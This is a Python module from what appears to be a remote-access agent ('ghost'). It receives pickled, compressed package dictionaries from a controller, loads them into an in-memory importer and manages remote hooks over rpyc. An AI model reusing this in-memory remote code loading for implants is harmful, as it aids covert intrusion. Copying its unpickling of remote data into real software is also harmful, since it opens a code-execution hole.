# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

__all__ = (
    'ghost_add_package', 'has_module', 'has_dll', 'new_modules',
    'new_dlls', 'invalidate_module',
    'register_package_request_hook', 'register_package_error_hook',
    'unregister_package_error_hook', 'unregister_package_request_hook',
    'safe_obtain', 'register_ghostimporter'
)

import sys
import zlib
import gc

import umsgpack

if sys.version_info.major > 2:
    import pickle
else:
    import cPickle as pickle


import ghost.agent
logger = None


def ghost_add_package(pkdic, compressed=False, name=None):
    ''' Update the modules dictionary to allow
        remote imports of new packages
    '''
    global logger
    if logger is None:
        logger = ghost.agent.get_logger('utils')
    import ghost_modules
    import logging
    logger.setLevel(logging.DEBUG)
    logger.debug(
        'Add package (size=%d compressed=%s name=%s)',
        len(pkdic), compressed, name)

    if compressed:
        pkdic = zlib.decompress(pkdic)

    module = pickle.loads(pkdic)

    logger.debug('Add files: %s', tuple(module))
    ghost_modules.modules.update(module)


def has_module(name):
    import ghost_modules
    try:
        if (name in sys.modules or name in sys.builtin_module_names or name in ghost_modules.modules):
            return True

        fsname = name.replace('.', '/')
        fsnames = (
            '{}.py'.format(fsname),
            '{}/__init__.py'.format(fsname),
            '{}.pyd'.format(fsname),
            '{}.so'.format(fsname)
        )

        for module in ghost_modules.modules:
            if module.startswith(fsnames):
                return True

        """
        if not ghost.agent.is_native():
            try:
                from importlib.machinery import PathFinder
                if PathFinder.find_module(name) is not None:
                    return True
            except Exception as e:
                logger.debug("Exception: %s", e)
                pass
        """
        return False

    except Exception as e:
        ghost.agent.dprint(
            'has_module Exception: {}/{} (type(name) == {})',
            type(e), e, type(name)
        )


def has_dll(name):
    return name in ghost.agent.dlls


def new_modules(names):
    ghost.agent.dprint('new_modules call: {}/{}', names, len(names))

    try:
        return [
            name for name in names if not has_module(name)
        ]

    except Exception as e:
        ghost.agent.dprint(
            'new_modules Exception: {}/{} (type(names) == {})',
            type(e), e, type(names)
        )

        return names


def new_dlls(names):
    return tuple(
        name for name in names if not has_dll(name)
    )


def invalidate_module(name):
    import ghost_modules
    for item in list(ghost_modules.modules):
        if item.startswith((name+'/', name+'.')):
            ghost.agent.dprint('Remove {} from ghostimporter.modules'.format(item))
            del ghost_modules.modules[item]

    for item in list(sys.modules):
        if not (item == name or item.startswith(name+'.')):
            continue

        del sys.modules[item]

        if ghost.agent.namespace:
            ghost.agent.dprint('Remove {} from rpyc namespace'.format(item))
            ghost.agent.namespace.__invalidate__(item)

    gc.collect()


def register_package_request_hook(hook):
    import ghost_hooks
    ghost_hooks.remote_load_package = hook

def register_package_error_hook(hook):
    # Must be importer at low level, because
    # may not be possible to load network.* at early phase
    from ghost.network.lib.rpc import nowait
    import ghost_hooks
    ghost_hooks.remote_print_error = nowait(hook)

def unregister_package_error_hook():
    import ghost_hooks
    ghost_hooks.remote_print_error = None


def unregister_package_request_hook():
    import ghost_hooks
    ghost_hooks.remote_load_package = None


def safe_obtain(proxy):
    # Safe version of rpyc's rpyc.utils.classic.obtain,
    # without using pickle.

    if type(proxy) in [list, str, bytes, dict, set, type(None)]:
        return proxy

    try:
        conn = object.__getattribute__(proxy, '____conn__')()
    except AttributeError:
        return proxy

    if not hasattr(conn, 'obtain'):
        setattr(conn, 'obtain', conn.root.msgpack_dumps)

    return umsgpack.loads(
        zlib.decompress(
            conn.obtain(proxy, compressed=True)
        )
    )


# RPC API for fake ghostimporter module

def register_ghostimporter():
    import ghost_modules
    ghostimporter = ghost.agent.make_module('ghostimporter')

    GHOSTIMPORTER_API_UTILS = (
        ghost_add_package, has_module, has_dll, new_modules,
        new_dlls, invalidate_module,
        register_package_request_hook, register_package_error_hook,
        unregister_package_error_hook, unregister_package_request_hook
    )

    for export in GHOSTIMPORTER_API_UTILS:
        setattr(ghostimporter, export.__name__, export)

    setattr(ghostimporter, 'load_dll', ghost.agent.load_dll)
    setattr(ghostimporter, 'modules', ghost_modules.modules)

    return ghostimporter
